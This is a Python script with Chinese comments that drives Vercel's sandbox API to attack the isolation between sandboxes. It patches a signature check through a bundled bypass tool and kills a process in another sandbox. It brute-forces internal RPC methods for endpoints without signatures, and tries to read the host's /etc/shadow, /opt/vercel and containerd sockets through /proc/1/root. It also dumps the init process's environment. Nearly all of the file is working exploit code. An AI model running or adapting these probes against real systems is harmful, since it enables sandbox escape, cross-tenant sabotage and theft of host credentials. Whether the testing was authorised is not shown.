# 实验J79: 新线三连 — /proc/1/root 宿主FS穿透(未patch) + 跨沙箱Kill签名缺失 + 方法字典枚举
import json, time, urllib.request, urllib.error, sys, base64, re
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return out

NAME_A = "expj79a"
NAME_B = "expj79b"
for n in (NAME_A, NAME_B):
    api("DELETE", f"/v2/sandboxes/{n}?teamId={TEAM}&projectId={PROJ}")

def create(name):
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name,
                "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
    print("create", name, ":", c)
    return json.loads(r)["sandbox"]["currentSessionId"]

SID_A = create(NAME_A)
print("sid A:", SID_A)

TOOL_B64 = base64.b64encode(open("init_sock_bypass.py", "rb").read()).decode()

# ---------- 沙箱 A: patch + spawn sleep 180 ----------
PROBE_A1 = r"""
import importlib.util, base64, os, json, re, sys
TOOL = base64.b64decode(r""" + '"' + TOOL_B64 + '"' + r""")
open("/tmp/ib.py", "wb").write(TOOL)
spec = importlib.util.spec_from_file_location("ib", "/tmp/ib.py")
ib = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ib)

print("== [1A] patch + spawn sleep 180 ==", flush=True)
ib.patch_sigcheck()
data = ib._rpc(ib.RPC, json.dumps({"command": "sleep", "arguments": ["180"]}).encode())
print("spawn resp:", data[:300], flush=True)
m = re.search(rb'"processId":"([^"]+)"', data)
if m:
    print("PID:", m.group(1).decode(), flush=True)
else:
    print("PID: NONE", flush=True)
"""
out_a = run_cmd(SID_A, PROBE_A1, "A1-patch-spawn", wait=True, timeout=120000)
pidm = re.search(r"PID: (proc_\w+)", out_a)
target = pidm.group(1) if pidm else "proc_NONE"
print("\n>> cross-sandbox kill target:", target, flush=True)

# ---------- 沙箱 B: 未 patch — kill A 的进程 + 方法枚举 + /proc/1/root 穿透 ----------
SID_B = create(NAME_B)
print("sid B:", SID_B)

PROBE_B = r"""
import importlib.util, base64, os, json, socket
TOOL = base64.b64decode(r""" + '"' + TOOL_B64 + '"' + r""")
open("/tmp/ib.py", "wb").write(TOOL)
spec = importlib.util.spec_from_file_location("ib", "/tmp/ib.py")
ib = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ib)

print("== [1B] 未patch 跨沙箱 Kill: TARGET_PID ==", flush=True)
ib.kill("TARGET_PID")

print("== [2B] 方法字典枚举 (未patch) ==", flush=True)
services = ["vercel.sandbox.spawn.v1.SpawnService",
            "vercel.cell.v1.CellService",
            "vercel.celld.v1.CelldService",
            "vercel.sandbox.spawn.v1.ProcessService",
            "vercel.sandbox.spawn.v1.ExecService",
            "vercel.sandbox.v1.RuntimeService",
            "vercel.sandbox.v1.VolumeService",
            "vercel.sandbox.v1.NetworkService"]
methods = ["Ping","Kill","Spawn","Exec","List","Info","Status","Logs","Wait","Signal",
           "Start","Stop","Restart","Destroy","Cleanup","Get","SetEnv","GetEnv","Stat",
           "Write","Read","Open","Close","Version","Describe","Events","Stream","Attach",
           "Resize","Connect","Watch","Snapshot","Restore","Copy","Move","Update","Patch"]
for svc in services:
    for m in methods:
        try:
            data = ib._rpc("/%s/%s" % (svc, m), b"{}", timeout=4)
        except Exception as e:
            print("[%s/%s] EXC %s" % (svc, m, e), flush=True)
            continue
        if b"404 page not found" in data:
            continue
        if b"invalid signature" in data:
            print("[%s/%s] sig-protected" % (svc, m), flush=True)
        else:
            print("[%s/%s] ** NOSIG: %r" % (svc, m, data[:90]), flush=True)

print("== [3B] /proc/1/root 穿 mount ns (未patch) ==", flush=True)
probe_paths = ["/proc/1/root/etc/shadow", "/proc/1/root/etc/passwd",
               "/proc/1/root/opt/vercel", "/proc/1/root/run/cell/cell.sock",
               "/proc/1/root/run/metrics/metrics.sock", "/proc/1/root/run/apm/apm.sock",
               "/proc/1/root/run/containerd/containerd.sock",
               "/proc/1/root/root/.ssh", "/proc/1/root/home"]
for p in probe_paths:
    try:
        st = os.stat(p)
        print("  %s EXISTS mode=%o size=%s" % (p, st.st_mode & 0o777, st.st_size), flush=True)
        if p.endswith(".sock"):
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect(p)
                print("    CONNECT OK", flush=True)
                s.close()
            except Exception as e:
                print("    connect EXC: %s: %s" % (type(e).__name__, e), flush=True)
    except Exception as e:
        print("  %s MISS: %s: %s" % (p, type(e).__name__, e), flush=True)

print("== [4B] /proc/1/root 内容抽样 ==", flush=True)
try:
    for f, n in [("/proc/1/root/etc/shadow", 400), ("/proc/1/root/opt/vercel", 800)]:
        if os.path.exists(f):
            d = open(f, "rb").read(n)
            print("  %s (%d bytes shown): %r" % (f, len(d), d[:n]), flush=True)
except Exception as e:
    print("  read EXC:", e, flush=True)
"""
PROBE_B = PROBE_B.replace("TARGET_PID", target)
out_b = run_cmd(SID_B, PROBE_B, "B-nopatch-kill-enum-procroot", wait=True, timeout=300000)

# ---------- 沙箱 A 第二轮: 验证 sleep 是否被杀 + /proc/1/environ + 宿主 socket 直接路径 ----------
PROBE_A2 = r"""
import os, subprocess, socket
print("== [5A] A 沙箱 ps (sleep 是否被 B 杀掉) ==", flush=True)
r = subprocess.run(["ps", "aux"], capture_output=True, text=True)
print(r.stdout, flush=True)

print("== [6A] /proc/1/environ / cmdline ==", flush=True)
try:
    env = open("/proc/1/environ", "rb").read()
    print("  environ len:", len(env), flush=True)
    print("  environ:", env.decode(errors="replace")[:1500], flush=True)
except Exception as e:
    print("  environ EXC:", type(e).__name__, e, flush=True)
try:
    cl = open("/proc/1/cmdline", "rb").read()
    print("  cmdline:", cl.decode(errors="replace").replace("\x00", " "), flush=True)
except Exception as e:
    print("  cmdline EXC:", type(e).__name__, e, flush=True)

print("== [7A] 宿主 socket 直接路径可达性 (沙箱内) ==", flush=True)
for p in ["/run/vercel/share/init.sock", "/run/cell/cell.sock", "/run/metrics/metrics.sock",
          "/run/apm/apm.sock", "/run/containerd/containerd.sock"]:
    print("  %s exists=%s" % (p, os.path.exists(p)), flush=True)
    if os.path.exists(p):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect(p)
            print("    CONNECT OK", flush=True)
            s.close()
        except Exception as e:
            print("    connect EXC: %s: %s" % (type(e).__name__, e), flush=True)
"""
run_cmd(SID_A, PROBE_A2, "A2-verify", wait=True, timeout=120000)

for n in (NAME_A, NAME_B):
    api("DELETE", f"/v2/sandboxes/{n}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
